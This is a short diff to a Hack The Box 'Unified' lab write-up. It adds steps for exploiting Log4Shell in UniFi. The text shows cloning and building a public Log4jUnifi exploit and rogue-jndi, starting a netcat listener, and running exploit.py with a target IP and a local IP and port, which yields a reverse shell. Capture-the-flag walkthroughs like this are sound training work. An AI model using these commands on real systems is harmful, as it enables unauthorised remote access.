@@ -133,6 +133,8 @@ Let's clone the respective repository and build the package using Maven.<br>
 git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jUnifi \ && cd Log4jUnifi && pip3 install -r requirements.txt
 mvn package -f utils/rogue-jndi/
 </pre>
+Open another window to execute the <code>nc</code> command, and then use the python script to attack the vulnerability.<br>
+<code>python exploit.py -u &lt;target_ip&gt; -i &lt;local_ip&gt; &lt;nc_port&gt;</code>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/exploit.py.png" alt="exploit" width="60%">
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/nc1.png" alt="nc1" width="60%">
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/nc2.png" alt="nc2" width="60%">
